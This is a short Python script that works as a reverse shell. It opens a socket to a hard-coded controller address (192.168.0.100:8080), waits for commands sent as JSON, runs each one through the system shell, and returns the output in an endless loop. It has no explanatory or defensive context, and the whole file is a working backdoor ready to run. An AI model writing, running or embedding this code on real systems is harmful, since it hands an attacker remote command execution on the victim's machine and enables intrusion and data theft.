#!/usr/bin/env python
import socket, subprocess, json


class socket_server:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data.decode('utf-8'))
        self.s.send(bytes(json_data, 'utf-8'))

    def reliable_receive(self):
        json_data = self.s.recv(1024).decode('utf-8')
        return json.loads(json_data)

    def execute_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            r = self.reliable_receive()
            command = self.execute_command(r)
            self.reliable_send(command)
        self.s.close()


if __name__ == '__main__':
    connect = socket_server("192.168.0.100", 8080)
    connect.run()